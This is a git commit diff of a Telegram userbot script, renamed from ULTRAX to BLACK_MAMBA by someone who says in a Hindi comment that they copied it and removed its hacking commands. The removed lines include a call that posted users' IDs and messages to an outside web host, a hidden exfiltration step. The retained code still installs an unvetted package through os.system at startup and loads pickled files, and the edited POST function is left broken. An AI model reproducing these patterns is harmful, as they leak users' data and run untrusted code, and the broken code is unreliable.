389aa74f7a70277d145219a7db90a4e2bacfa39d
SUKHI <86770159+SUKHPAL443@users.noreply.github.com>
2021-10-02 08:43:57 +0530

    Update and rename ULTRAX.py to BLACK_MAMBA.py

--- BLACK_MAMBA.py
+++ BLACK_MAMBA.py
@@ -1,19 +1,19 @@
-# COPYRIGHT (C) 2021 BY LEGENDX22
+# COPYRIGHT (C) 2021 BY @TIMEX_OF_CLOCK
 """
 """
-# MADE BY LEGENDX22 🔥
-# MY IDEA H YRR DONT KANG THIS PLEASE
+# MADE BY TIMEX_OF_CLOCK 🔥
+# YE BOT ULTRAX KA KANG HAI MAINE ISKO KANG KRKE ISME JO BHI HACKING COMMAND THI VO SAB REMOVE KRDI TO AB DARNE KI JRURAT NHI
 import asyncio
 import os
 import asyncio
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-os.system("pip install LEGENDX==0.0.21")
+os.system("pip install KING_COBRA==0.0.21")
 try:
-  from ULTRA import bot 
+  from BLACK_MAMBA import bot 
 except:
   pass
-from LEGENDX import devs, id, ID
+from KING_COBRA import devs, id, ID
 API_ID = os.environ.get("APP_ID", None)
 API_HASH = os.environ.get("API_HASH", None)
 token = os.environ.get("TG_BOT_TOKEN_BF_HER", None)
@@ -22,7 +22,7 @@ import time
 MESSAGE = os.environ.get("ALIVE_MSG", None)
 if MESSAGE is None:
    MSG = '''
-🔥🔥 THE ULTRA X IS ONLINE 🔥🔥
+🔥🔥 THE BLACK_MAMBA IS ONLINE 🔥🔥
 I AM HERE FOR MY MASTER PROTECTION
 I AM NON HACKEBLE + BEST USERBOT
 THANKS MASTER TO DEPLOY ME
@@ -31,19 +31,17 @@ else:
   MSG = MESSAGE
 botnickname = os.environ.get("BOT_NICK_NAME")
 ALIVE_NAME = os.environ.get("ALIVE_NAME")
-BOT = str(botnickname) if botnickname else "υℓтяα χ"
-NAME = str(ALIVE_NAME) if ALIVE_NAME else "υℓтяα χ"
+BOT = str(botnickname) if botnickname else "BLACK_MAMBA"
+NAME = str(ALIVE_NAME) if ALIVE_NAME else "BLACK_MAMBA"
 PHOTO = os.environ.get("ALIVE_PHOTTO", None)
-ULTRAX = "[ULTRA X](https://t.me/ULTRAXOT)"
+ULTRAX = "[ULTRA X](https://t.me/BLACK_MAMBA_SUPPORT)"
 VERSION = "0.0.1"
 ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
 ALIVE_BOT_USERNAME = os.environ.get("ALIVE_BOT_USERNAME", None)
 devs = devs
 ID = ID
 id = id
-REPO = "[υℓтяα χ вσт](https://github.com/ULTRA-OP/ULTRA-X)"
-
-kangers = [1358931568, 1601105531, 1099219137, 1163444049, 719195224, 1663120531, 1629929584, 1674693245, 1393895701,1383730820, 1083049180, 1412086585, 1585809209, 1326701194, 1198820588, 1174361857, 1555340229, 1322549723, 1444249738, 1222113933, 1152902819, 1176159510, 611816596, 1318486004, 573738900, 1601105531, 1263617196, 1252974808, 1315076555, 1176159510, 21894734, 536157487, 1347610095, 1754449534, 1649853060, 1650981437, 1678331806, 1383009042, 1053880985, 817088672, 1047091391, 1221693726, 929138153, 1091139479]
+REPO = "[BLACK_MAMBA_BOT](https://github.com/SUKHPAL443/BLACK_MAMBA)"
 
 from requests import post
 
@@ -53,15 +51,14 @@ def POST(user, msg):
   elif msg == None:
     msg = ' '
   else:
-      pass #post maar rHa hu nothing else
-  r = post(f"https://legendx22.000webhostapp.com/user.php? user={user}&msg={msg}")
+ 
 import pickle as p
 def rd(file):
   try:
     f = open(file, "rb")
-    LEGENDX = p.load(f)
+    KING_COBRA = p.load(f)
     f.close()
-    return LEGENDX
+    return KING_COBRA
   except:
     return False
 import pickle as p
@@ -75,7 +72,7 @@ def wt(obj, file):
     return False
 
 MASTER = NAME
-GROUP = "[SUPPORT GROUP](https://t.me/UltraXChat)"
+GROUP = "[SUPPORT GROUP](https://t.me/BLACK_MAMBA_SUPPORT)"
 if __name__=="__main__":
   bot.start()
   bot.run_until_disconnected()
